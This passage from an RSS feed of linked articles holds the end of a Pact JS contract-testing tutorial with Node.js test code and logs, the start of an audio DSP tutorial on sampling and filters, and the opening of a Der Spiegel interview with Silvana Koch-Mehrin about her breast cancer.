<em>Figure 3: Consumer-driven contract testing</em></p><h2 id="what-is-pact"><span>What is Pact?</span></h2><p><a href="https://pact.io/">Pact</a> is a code-first consumer-driven contract testing tool. Consumer contracts, also called Pacts, are defined in code and are generated after successfully running the consumer tests. The Pact files use JSON format and are used to spin up a Pact Mock Service to test and verify the compatibility of the provider API.</p><p>The tool also offers the so-called Pact Mock Provider, with which developers can implement and test the consumer using a mocked API. This, in turn, accelerates development time, as teams don't have to wait for the provider to be available.</p><p><img src="https://cdn.codersociety.com/uploads/pact-overview.png">
<em>Figure 4: Pact overview</em></p><p>Pact was initially designed for request/response interactions and supports both REST and GraphQL APIs, as well as many different <a href="https://docs.pact.io/implementation_guides">programming languages</a>. For Providers written in languages that don't have native Pact support, you can still use the generic <a href="https://github.com/pact-foundation/pact-provider-verifier">Pact Provider Verification tool</a>.</p><h2 id="try-out-pact"><span>Try out Pact</span></h2><p>Why don't we test things ourselves and see how consumer-driven contract testing with Pact actually works? For this, we use <a href="https://github.com/pact-foundation/pact-js">Pact JS</a>, the Pact library for JavaScript, and Node.js. We've already created a <a href="https://github.com/coder-society/contract-testing-nodejs-pact">sample repository</a> containing an order API, which returns a list of orders. Let’s start by cloning the project and installing the dependencies:</p><div><div><div><div><pre><p><span>$ </span><span>git</span><span> clone https://github.com/coder-society/contract-testing-nodejs-pact.git</span></p><p><span>$ </span><span>cd</span><span> contract-testing-nodejs-pact</span></p><p><span>$ </span><span>npm</span><span> </span><span>install</span></p></pre></div></div></div></div><h2 id="writing-a-pact-consumer-test"><span>Writing a Pact consumer test</span></h2><p>We created a file called <code>consumer.spec.js</code> to define the expectedinteractions between our order API client (consumer) and the order API itself (provider). We expect the following interactions:</p><ul><li>HTTP GET request against path <code>/orders</code> which returns a list of orders.</li><li>The order response matches a defined structure. For this we use <a href="https://github.com/pact-foundation/pact-js#matching">Pact’s Matchers</a>.</li></ul><div><div><div><div><pre><p><span>const</span><span> assert </span><span>=</span><span> </span><span>require</span><span>(</span><span>'assert'</span><span>)</span><span></span></p><p><span></span><span>const</span><span> </span><span>{</span><span> </span><span>Pact</span><span>,</span><span> </span><span>Matchers</span><span> </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'@pact-foundation/pact'</span><span>)</span><span></span></p><p><span></span><span>const</span><span> </span><span>{</span><span> fetchOrders </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'./consumer'</span><span>)</span><span></span></p><p><span></span><span>const</span><span> </span><span>{</span><span> eachLike </span><span>}</span><span> </span><span>=</span><span> </span><span>Matchers</span><span></span></p><p><span></span><span>describe</span><span>(</span><span>'Pact with Order API'</span><span>,</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>const</span><span> provider </span><span>=</span><span> </span><span>new</span><span> </span><span>Pact</span><span>(</span><span>{</span><span></span></p><p><span>    port</span><span>:</span><span> </span><span>8080</span><span>,</span><span></span></p><p><span>    consumer</span><span>:</span><span> </span><span>'OrderClient'</span><span>,</span><span></span></p><p><span>    provider</span><span>:</span><span> </span><span>'OrderApi'</span><span>,</span><span></span></p><p><span>  </span><span>}</span><span>)</span><span></span></p><p><span>  </span><span>before</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> provider</span><span>.</span><span>setup</span><span>(</span><span>)</span><span>)</span><span></span></p><p><span>  </span><span>after</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> provider</span><span>.</span><span>finalize</span><span>(</span><span>)</span><span>)</span><span></span></p><p><span>  </span><span>describe</span><span>(</span><span>'when a call to the API is made'</span><span>,</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>before</span><span>(</span><span>async</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>      </span><span>return</span><span> provider</span><span>.</span><span>addInteraction</span><span>(</span><span>{</span><span></span></p><p><span>        state</span><span>:</span><span> </span><span>'there are orders'</span><span>,</span><span></span></p><p><span>        uponReceiving</span><span>:</span><span> </span><span>'a request for orders'</span><span>,</span><span></span></p><p><span>        withRequest</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>          path</span><span>:</span><span> </span><span>'/orders'</span><span>,</span><span></span></p><p><span>          method</span><span>:</span><span> </span><span>'GET'</span><span>,</span><span></span></p><p><span>        </span><span>}</span><span>,</span><span></span></p><p><span>        willRespondWith</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>          body</span><span>:</span><span> </span><span>eachLike</span><span>(</span><span>{</span><span></span></p><p><span>            id</span><span>:</span><span> </span><span>1</span><span>,</span><span></span></p><p><span>            items</span><span>:</span><span> </span><span>eachLike</span><span>(</span><span>{</span><span></span></p><p><span>              name</span><span>:</span><span> </span><span>'burger'</span><span>,</span><span></span></p><p><span>              quantity</span><span>:</span><span> </span><span>2</span><span>,</span><span></span></p><p><span>              value</span><span>:</span><span> </span><span>100</span><span>,</span><span></span></p><p><span>            </span><span>}</span><span>)</span><span>,</span><span></span></p><p><span>          </span><span>}</span><span>)</span><span>,</span><span></span></p><p><span>          status</span><span>:</span><span> </span><span>200</span><span>,</span><span></span></p><p><span>        </span><span>}</span><span>,</span><span></span></p><p><span>      </span><span>}</span><span>)</span><span></span></p><p><span>    </span><span>}</span><span>)</span><span></span></p><p><span>    </span><span>it</span><span>(</span><span>'will receive the list of current orders'</span><span>,</span><span> </span><span>async</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>      </span><span>const</span><span> result </span><span>=</span><span> </span><span>await</span><span> </span><span>fetchOrders</span><span>(</span><span>)</span><span></span></p><p><span>      assert</span><span>.</span><span>ok</span><span>(</span><span>result</span><span>.</span><span>length</span><span>)</span><span></span></p><p><span>    </span><span>}</span><span>)</span><span></span></p><p><span>  </span><span>}</span><span>)</span><span></span></p><p><span></span><span>}</span><span>)</span></p></pre></div></div></div></div><p>Run the Pact consumer tests using the following command:</p><div><div><div><div><pre><p><span>$ </span><span>npm</span><span> run test:consumer</span></p><p><span></span><span>&gt;</span><span> contract-testing-nodejs-pact@1.0.0 test:consumer /Users/kentarowakayama/CODE/contract-testing-nodejs-pact</span></p><p><span></span><span>&gt;</span><span> mocha consumer.spec.js</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:22:44.144Z</span><span>]</span><span>  INFO: pact-node@10.11.0/7575 on coder.local: </span></p><p><span>    Creating Pact Server with options: </span></p><p><span>    </span><span>{</span><span>"consumer"</span><span>:</span><span>"OrderClient"</span><span>,</span><span>"cors"</span><span>:false,</span><span>"dir"</span><span>:</span><span>"/Users/kentarowakayama/CODE/contract-testing-nodejs-pact/pacts"</span><span>,</span><span>"host"</span><span>:</span><span>"127.0.0.1"</span><span>,</span><span>"log"</span><span>:</span><span>"/Users/kentarowakayama/CODE/contract-testing-nodejs-pact/logs/pact.log"</span><span>,</span><span>"pactFileWriteMode"</span><span>:</span><span>"overwrite"</span><span>,</span><span>"port"</span><span>:8080,</span><span>"provider"</span><span>:</span><span>"OrderApi"</span><span>,</span><span>"spec"</span><span>:2,</span><span>"ssl"</span><span>:false</span><span>}</span><span></span></p><p><span>  Pact with Order API</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:22:45.204Z</span><span>]</span><span>  INFO: pact@9.13.0/7575 on coder.local: </span></p><p><span>    Setting up Pact with Consumer </span><span>"OrderClient"</span><span> and Provider </span><span>"OrderApi"</span><span></span></p><p><span>        using mock </span><span>service</span><span> on Port: </span><span>"8080"</span><span></span></p><p><span>    when a call to the API is made</span></p><p><span></span><span>[</span><span>{</span><span>"id"</span><span>:1,</span><span>"items"</span><span>:</span><span>[</span><span>{</span><span>"name"</span><span>:</span><span>"burger"</span><span>,</span><span>"quantity"</span><span>:2,</span><span>"value"</span><span>:100</span><span>}</span><span>]</span><span>}</span><span>]</span><span></span></p><p><span>      ✓ will receive the list of current orders</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:22:45.231Z</span><span>]</span><span>  INFO: pact@9.13.0/7575 on coder.local: Pact File Written</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:22:45.231Z</span><span>]</span><span>  INFO: pact-node@10.11.0/7575 on coder.local: Removing Pact process with PID: </span><span>7576</span><span></span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:22:45.234Z</span><span>]</span><span>  INFO: pact-node@10.11.0/7575 on coder.local: </span></p><p><span>    Deleting Pact Server with options: </span></p><p><span>    </span><span>{</span><span>"consumer"</span><span>:</span><span>"OrderClient"</span><span>,</span><span>"cors"</span><span>:false,</span><span>"dir"</span><span>:</span><span>"/Users/kentarowakayama/CODE/contract-testing-nodejs-pact/pacts"</span><span>,</span><span>"host"</span><span>:</span><span>"127.0.0.1"</span><span>,</span><span>"log"</span><span>:</span><span>"/Users/kentarowakayama/CODE/contract-testing-nodejs-pact/logs/pact.log"</span><span>,</span><span>"pactFileWriteMode"</span><span>:</span><span>"overwrite"</span><span>,</span><span>"port"</span><span>:8080,</span><span>"provider"</span><span>:</span><span>"OrderApi"</span><span>,</span><span>"spec"</span><span>:2,</span><span>"ssl"</span><span>:false</span><span>}</span><span></span></p><p><span>  </span><span>1</span><span> passing </span><span>(</span><span>1s</span><span>)</span></p></pre></div></div></div></div><p>The consumer tests generate a Pact contract file named "orderclient-orderapi.json" in the "pacts" folder, which looks like this:</p><div><div><div><div><pre><p><span>{</span><span></span></p><p><span>  </span><span>"consumer"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>"name"</span><span>:</span><span> </span><span>"OrderClient"</span><span></span></p><p><span>  </span><span>}</span><span>,</span><span></span></p><p><span>  </span><span>"provider"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>"name"</span><span>:</span><span> </span><span>"OrderApi"</span><span></span></p><p><span>  </span><span>}</span><span>,</span><span></span></p><p><span>  </span><span>"interactions"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>    </span><span>{</span><span></span></p><p><span>      </span><span>"description"</span><span>:</span><span> </span><span>"a request for orders"</span><span>,</span><span></span></p><p><span>      </span><span>"providerState"</span><span>:</span><span> </span><span>"there are orders"</span><span>,</span><span></span></p><p><span>      </span><span>"request"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>        </span><span>"method"</span><span>:</span><span> </span><span>"GET"</span><span>,</span><span></span></p><p><span>        </span><span>"path"</span><span>:</span><span> </span><span>"/orders"</span><span></span></p><p><span>      </span><span>}</span><span>,</span><span></span></p><p><span>      </span><span>"response"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>        </span><span>"status"</span><span>:</span><span> </span><span>200</span><span>,</span><span></span></p><p><span>        </span><span>"headers"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>        </span><span>}</span><span>,</span><span></span></p><p><span>        </span><span>"body"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>          </span><span>{</span><span></span></p><p><span>            </span><span>"id"</span><span>:</span><span> </span><span>1</span><span>,</span><span></span></p><p><span>            </span><span>"items"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>              </span><span>{</span><span></span></p><p><span>                </span><span>"name"</span><span>:</span><span> </span><span>"burger"</span><span>,</span><span></span></p><p><span>                </span><span>"quantity"</span><span>:</span><span> </span><span>2</span><span>,</span><span></span></p><p><span>                </span><span>"value"</span><span>:</span><span> </span><span>100</span><span></span></p><p><span>              </span><span>}</span><span></span></p><p><span>            </span><span>]</span><span></span></p><p><span>          </span><span>}</span><span></span></p><p><span>        </span><span>]</span><span>,</span><span></span></p><p><span>        </span><span>"matchingRules"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>          </span><span>"$.body"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>            </span><span>"min"</span><span>:</span><span> </span><span>1</span><span></span></p><p><span>          </span><span>}</span><span>,</span><span></span></p><p><span>          </span><span>"$.body[*].*"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>            </span><span>"match"</span><span>:</span><span> </span><span>"type"</span><span></span></p><p><span>          </span><span>}</span><span>,</span><span></span></p><p><span>          </span><span>"$.body[*].items"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>            </span><span>"min"</span><span>:</span><span> </span><span>1</span><span></span></p><p><span>          </span><span>}</span><span>,</span><span></span></p><p><span>          </span><span>"$.body[*].items[*].*"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>            </span><span>"match"</span><span>:</span><span> </span><span>"type"</span><span></span></p><p><span>          </span><span>}</span><span></span></p><p><span>        </span><span>}</span><span></span></p><p><span>      </span><span>}</span><span></span></p><p><span>    </span><span>}</span><span></span></p><p><span>  </span><span>]</span><span>,</span><span></span></p><p><span>  </span><span>"metadata"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>"pactSpecification"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>      </span><span>"version"</span><span>:</span><span> </span><span>"2.0.0"</span><span></span></p><p><span>    </span><span>}</span><span></span></p><p><span>  </span><span>}</span><span></span></p><p><span></span><span>}</span></p></pre></div></div></div></div><h2 id="verifying-the-consumer-pact-against-the-api-provider"><span>Verifying the consumer pact against the API provider</span></h2><p>We can now use the generated Pact contract file to verify our order API. To do so, run the following command:</p><div><div><div><div><pre><p><span>$ </span><span>npm</span><span> run test:provider</span></p><p><span></span><span>&gt;</span><span> contract-testing-nodejs-pact@1.0.0 test:provider /Users/kentarowakayama/CODE/contract-testing-nodejs-pact</span></p><p><span></span><span>&gt;</span><span> node verify-provider.js</span></p><p><span>Server is running on http://localhost:8080</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:21:15.038Z</span><span>]</span><span>  INFO: pact@9.13.0/7077 on coder.local: Verifying provider</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:21:15.050Z</span><span>]</span><span>  INFO: pact-node@10.11.0/7077 on coder.local: Verifying Pacts.</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:21:15.054Z</span><span>]</span><span>  INFO: pact-node@10.11.0/7077 on coder.local: Verifying Pact Files</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:21:16.343Z</span><span>]</span><span>  WARN: pact@9.13.0/7077 on coder.local: No state handler found </span><span>for</span><span> </span><span>"there are orders"</span><span>, ignoring</span></p><p><span></span><span>[</span><span>2020</span><span>-11-03T17:21:16.423Z</span><span>]</span><span>  INFO: pact-node@10.11.0/7077 on coder.local: Pact Verification succeeded.</span></p></pre></div></div></div></div><p>The code to verify the provider can be found in <a href="https://github.com/coder-society/contract-testing-nodejs-pact/blob/master/verify-provider.js">verify-pact.js</a> and looks like this:</p><div><div><div><div><pre><p><span>const</span><span> path </span><span>=</span><span> </span><span>require</span><span>(</span><span>'path'</span><span>)</span><span></span></p><p><span></span><span>const</span><span> </span><span>{</span><span> </span><span>Verifier</span><span> </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'@pact-foundation/pact'</span><span>)</span><span></span></p><p><span></span><span>const</span><span> </span><span>{</span><span> startServer </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'./provider'</span><span>)</span><span></span></p><p><span></span><span>startServer</span><span>(</span><span>8080</span><span>,</span><span> </span><span>async</span><span> </span><span>(</span><span>server</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>console</span><span>.</span><span>log</span><span>(</span><span>'Server is running on http://localhost:8080'</span><span>)</span><span></span></p><p><span>  </span><span>try</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>await</span><span> </span><span>new</span><span> </span><span>Verifier</span><span>(</span><span>{</span><span></span></p><p><span>      providerBaseUrl</span><span>:</span><span> </span><span>'http://localhost:8080'</span><span>,</span><span></span></p><p><span>      pactUrls</span><span>:</span><span> </span><span>[</span><span>path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span><span> </span><span>'./pacts/orderclient-orderapi.json'</span><span>)</span><span>]</span><span>,</span><span></span></p><p><span>    </span><span>}</span><span>)</span><span>.</span><span>verifyProvider</span><span>(</span><span>)</span><span></span></p><p><span>  </span><span>}</span><span> </span><span>catch</span><span> </span><span>(</span><span>error</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>console</span><span>.</span><span>error</span><span>(</span><span>'Error: '</span><span> </span><span>+</span><span> error</span><span>.</span><span>message</span><span>)</span><span></span></p><p><span>    process</span><span>.</span><span>exit</span><span>(</span><span>1</span><span>)</span><span></span></p><p><span>  </span><span>}</span><span></span></p><p><span>  server</span><span>.</span><span>close</span><span>(</span><span>)</span><span></span></p><p><span></span><span>}</span><span>)</span></p></pre></div></div></div></div><p>This starts the API server and runs the Pact Verifier. After successful verification, we know that the order API and the client are compatible and can be deployed with confidence.</p><h2 id="wrapping-up"><span>Wrapping up</span></h2><p>By now you should have a good understanding of contract testing and how consumer-driven contract testing works. You also learned about Pact and how to use it to ensure the …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codersociety.com/blog/articles/contract-testing-pact">https://codersociety.com/blog/articles/contract-testing-pact</a></em></p>]]>
            </description>
            <link>https://codersociety.com/blog/articles/contract-testing-pact</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024836</guid>
            <pubDate>Sun, 08 Nov 2020 10:51:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital sound processing tutorial for the braindead]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024835">thread link</a>) | @cunidev
<br/>
November 8, 2020 | http://yehar.com/blog/?p=121 | <a href="https://web.archive.org/web/*/http://yehar.com/blog/?p=121">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>In 1998, I had some extra time while others were reading for final exams of the senior high school, and got into digital signal processing. I wrote as I learned, and here is the result. It is not entirely accurate in places but may serve as a nice tutorial into the world of audio DSP. Previously this document was called Yehar's digital sound processing tutorial for the braindead, but I have kinda grown out of  my scene identity over the years. Enjoy the ASCII art!</p>
<p>Chapters:</p>
<ul>
<li><a href="#dspstuff_1">Foreword</a></li>
<li><a href="#dspstuff_2">About sampled sound</a></li>
<li><a href="#dspstuff_3">Adding two sine waves together</a></li>
<li><a href="#dspstuff_4">What's a filter?</a></li>
<li><a href="#dspstuff_5">Filter types: FIR and IIR</a></li>
<li><a href="#dspstuff_6">Interpolation of sampled sound</a></li>
<li><a href="#dspstuff_7">About filter design</a></li>
<li><a href="#dspstuff_8">Pole-zero IIR filter design</a></li>
<li><a href="#dspstuff_9">Some pole-zero IIR filters</a></li>
<li><a href="#dspstuff_10">Windowed FIR filter design</a></li>
<li><a href="#dspstuff_11">Filter implementation</a></li>
<li><a href="#dspstuff_12">Positive and negative frequencies</a></li>
<li><a href="#dspstuff_13">Frequency shifting</a></li>
<li><a href="#dspstuff_14">Nature of sound and music</a></li>
<li><a href="#dspstuff_15">Flanger </a></li>
<li><a href="#dspstuff_16">Wavetable synthesis</a></li>
</ul>
<p>Bonus chapters:</p>
<ul>
<li><a href="#dspstuff_17">Shuffling IIR equations</a></li>
<li><a href="#dspstuff_18">A collection of IIR filters</a></li>
<li><a href="#dspstuff_19">A collection of FIR filters</a></li>
</ul>
<h2><a name="dspstuff_1">Foreword</a></h2>
<p>This is written for the audio digital signal processing enthusiasts (as the title suggests ;) and others who need practical information on the subject. If you don't have this as a "linear reading experience" and encounter difficulties, check if there's something to help you out in the previous chapters.</p>
<p>In filter frequency response plots, linear frequency and magnitude scales are used. Page changes are designed for 60+ lines/page printers.</p>
<p>Chapter "Shuffling IIR equations" is written by my big brother Kalle. And, thanks to Timo Tossavainen for sharing his DSP knowledge!</p>
<p>Copy and use this text freely.</p>
<p>by Olli Niemitalo, o@iki.fi</p>
<h2><a name="dspstuff_2">About sampled sound</a></h2>
<p>Note that "sample" can mean (1) a sampled sound or (2) a samplepoint!</p>
<p>Sampled sound data is a pile of samples, amplitude values taken from the actual sound wave. Sampling rate is the frequency of the "shots". For example, if the frequency is 44100, 44100 samples have been taken in one second.</p>
<p>Here's an example of sampling:</p>
<pre>                                           _0---0_
                                         _/       --0__
        0_                __0---0__    _0              -0---0___
          \_          _-0-         -0--                         0-__
        +---0==-+--=0---+---+---+---+---+---+---+---+---+---+---+---0==-+---+
               -0--                                                    -0_
                                                                          --0
                                            &lt;---&gt;
                                        1/Samplerate</pre>
<p>The original sound is the curve, and "0"s are the sampled points. The horizontal straight line is the zero level.</p>
<p>A sampled sound can only represent frequencies up to half the samplerate. This is called the Nyquist frequency. An easy proof: You need to have stored at least two samplepoints per wave cycle, the top and the bottom of the wave to be able to reconstruct it later on:</p>
<pre>        0\     /0\     /0\     /0\     /0\     /0\     /0\     /0\     /0\
          |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |
        +-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+-|-+
          |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |
           \0/     \0/     \0/     \0/     \0/     \0/     \0/     \0/     \0</pre>
<p>If you try to include above Nyquist frequencies in your sampled sound, all you get is extra distortion as they appear as lower frequencies.</p>
<h2><a name="dspstuff_3">Adding two sine waves together</a></h2>
<p>A Sound consists of frequency components. They all look exactly like sine waves, but they have different frequencies, phases and amplitudes. Let's look at a single frequency:</p>
<pre>                | __        __        __        __      |
                |/  \      /  \      /  \      /  \     |
                /----\----/----\----/----\----/----\----/
                |     \__/      \__/      \__/      \__/|
                |                                       |</pre>
<p>Now, we take the same frequency from another sound and notice that it has the same amplitude, but the opposite (rotated 180 degrees) phase.</p>
<pre>                |      __        __        __        __ |
                |     /  \      /  \      /  \      /  \|
                \----/----\----/----\----/----\----/----\
                |\__/      \__/      \__/      \__/     |
                |                                       |</pre>
<p>Merging two signals is done simply by adding them together. If we do the same with these two sine waves, the result will be:</p>
<pre>                |                                       |
                |                                       |
                +=======================================+
                |                                       |
                |                                       |</pre>
<p>It gets silent. If we think of other cases, where the phase difference is less than 180 degrees, we get sine waves that all have different amplitudes and phases, but the same frequency.</p>
<p>Here's the way to calculate the phase and the amplitude of the resulting sinewave... Convert the amplitude and phase into one complex number, where angle is the phase, and absolute value the amplitude.</p>
<pre>        amplitude*e^(i*phase) = amplitude*cos(phase)+i*amplitude*sin(phase)</pre>
<p>If you do this to both of the sinewaves, you can add them together as complex numbers.</p>
<p>Example:</p>
<pre>        (Wave A) amplitude 1, phase 0, (Wave B) amplitude 1, phase 90 degrees

                   _---|---_         _---0---_         _---|---_ 0
                  /    |    \       /    |    \       /    |    \
                 |     |     |     |     |     |     |     |     |
                -|-----+-----0- + -|-----+-----|- = -|-----+-----|-
                 |     |     |     |     |     |     |     |     |
                  \_   |   _/       \_   |   _/       \_   |   _/
                    ---|---           ---|---           ---|---</pre>
<p>As you see, the phase of the new sine wave is 45 degrees and the amplitude sqrt(1^2+1^2) = sqrt(2) = about 1.4</p>
<p>It is very important that you understand this, because in many cases, it is more practical to present the amplitude and the phase of a frequency as a complex number.</p>
<p>When adding two sampled sounds together, you may actually wipe out some frequencies, those that had opposite phases and equal amplitudes. The average amplitude of the resulting sound is (for independent originals) sqrt(a^2+b^2) where a and b are the amplitudes of the original signals.</p>
<h2><a name="dspstuff_4">What's a filter?</a></h2>
<p>The main use of a filter is to scale the amplitudes of the frequency components in a sound. For example, a "lowpass filter" mutes all frequency components above the "cutoff frequency", in other words, multiplies the amplitudes by 0. It lets through all the frequencies below the cutoff frequency unattenuated.</p>
<h3>Magnitude</h3>
<p>If you investigate the behaviour of a lowpass filter by driving various sinewaves of different frequencies through it, and measure the amplifications, you get the "magnitude frequency response". Here's a plot of the magnitude frequency response curve of a lowpass filter:</p>
<pre>                1-+----------------------_                              |
                  |                       \                             |
                  |       Audible          |          Inaudible         |
                  |                        |                            |
                  |                        |                            |
                  |                         \_                          |
                0-+---------------------------===========================
                  |                        |                            |
                 0Hz                Cutoff frequency                   max</pre>
<p>Frequency is on the "-" axis and amplification on the "|" axis. As you see, the amplification (= scaling) of the frequencies below the cutoff frequency is 1. So, their amplitudes are not affected in any way. But the amplitudes of frequencies above the cutoff frequency get multiplied by zero so they vanish.</p>
<p>Filters never add any new frequency components to the sound. They can only scale the amplitudes of already existing frequencies. For example, if you have a completely quiet sample, you can't get any sound out of it by filtering. Also, if you have a sine wave sample and filter it, the result will still be the same sine wave, only maybe with different amplitude and phase - no other frequencies can appear.</p>
<h3>Phase</h3>
<p>Professionals never get tired of reminding us how important it is not to forget the phase. The frequency components in a sound have their amplitudes and... phases. If we take a sine wave and a cosine wave, we see that they look alike, but they have a phase difference of pi/2, one fourth of a full cycle. Also, when you play them, they sound alike. But, try wearing a headset and play the sinewave on the left channel and the cosine wave on the right channel. Now you hear the difference!</p>
<p>Phase itself doesn't contain important information for us so it's not heard, but the phase difference, of a frequency, between the two ears can be used in estimating the position of the origin of the sound so it's heard.</p>
<p>Filters have a magnitude frequency response, but they also have a phase frequency response. Here's an example curve that could be from a lowpass filter:</p>
<pre>              +pi-+-----------------------------------------------------+
                  |                    ___                              |
                  |      _________-----   \                             |
                0-+======------------------|---------====================
                  |                         \___-----                   |
                  |                                                     |
              -pi-+-----------------------------------------------------+
                  |                        |                            |
                 0Hz                Cutoff frequency                   max</pre>
<p>If you filter a sound, the values from the phase frequency response …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://yehar.com/blog/?p=121">http://yehar.com/blog/?p=121</a></em></p>]]>
            </description>
            <link>http://yehar.com/blog/?p=121</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024835</guid>
            <pubDate>Sun, 08 Nov 2020 10:51:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“Only a Woman If You Have Breasts? That's Nonsense”]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25024715">thread link</a>) | @Tomte
<br/>
November 8, 2020 | https://www.spiegel.de/international/zeitgeist/a-personal-experience-with-breast-cancer-only-a-woman-if-you-have-breasts-that-s-nonsense-a-88da903d-2aa5-428b-99d6-a4fc4ce28a68 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/zeitgeist/a-personal-experience-with-breast-cancer-only-a-woman-if-you-have-breasts-that-s-nonsense-a-88da903d-2aa5-428b-99d6-a4fc4ce28a68">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="true">


</section>
<section>
<div>
<section>
<p><em>NOTE TO OUR READERS: Journalist Hajo Schumacher, who conducted this interview, and former politician Silvana Koch-Mehrin have known each other for many years. It is on the basis of this mutual trust that Koch-Mehrin responded to the questions that many of our readers found to be impertinent and unsettling. We apologize for not having been clear about their rapport from the very beginning.</em></p>
</section>


<section>
<p><strong>DER SPIEGEL:</strong> Ms. Koch-Mehrin, you were diagnosed with breast cancer last fall. How are you doing today?</p><p><strong>Koch-Mehrin:</strong> I'm doing well, thank you. I feel healthy. And the prognoses look good; it will likely stay that way.</p><p><strong>DER SPIEGEL:</strong> What physical and psychological effects did your experience leave you with.</p><p><strong>Koch-Mehrin:</strong> So much has changed that "leave" is the wrong word. Cancer diagnosis, mastectomy, chemo and radiation therapy: It is an existential experience. Very little is like it was before, both physically and psychologically. But it's not worse, just different.</p><p><strong>DER SPIEGEL:</strong> Can you give us an example?</p>
</section>


<section>
<p><strong>Koch-Mehrin:</strong> The side effects I experienced from chemo included a runny and bloody nose, my eyes would tear up and I had to constantly clear my throat. Picking up and holding small things became difficult and I experienced a loss of feeling in my fingertips. My hair, eyebrows and eyelashes fell out. "Before," I took those things, and the ability to do things, for granted. Now, I see it as a gift.</p><p><strong>DER SPIEGEL:</strong> Describe the moment when you received your diagnosis.</p><p><strong>Koch-Mehrin:</strong> I can precisely recall every detail - the vase on the table, the pictures and books on the shelf. I was in the United States for work and was sitting in a friend's office when my doctor called me: cancer. It was a shock because I felt so healthy. I thought it was just my normal annual checkup. Simply uttering the sentence "I have cancer" sounded to me like "I am dying." Still, even after the telephone call, I went to all of the meetings on my schedule. I was like a robot, which is probably a protective mechanism. The doctor's optimism helped me a great deal in getting over the shock. I can only urge all women, even if you're under 50, to please get screened regularly. The stage at which cancer is discovered makes a huge difference.</p>
</section>

<section>
<p><strong>DER SPIEGEL:</strong> Is breast cancer more taboo than other varieties of cancer?</p><p><strong>Koch-Mehrin:</strong> When people learn from somebody that he or she has cancer, they often fall silent. They don't know what to say. And how should they? "You'll be fine" sounds rather desperate and doesn't help the person who is sick. We live in a society that suppresses things: We still ignore illness and death far too often. Because of that, many women remain silent about their breast cancer diagnosis. On the one hand, they do so because they themselves are shaken up, but also because they want to spare others from having to talk about something they simply can't talk about.</p>
</section>

<section>
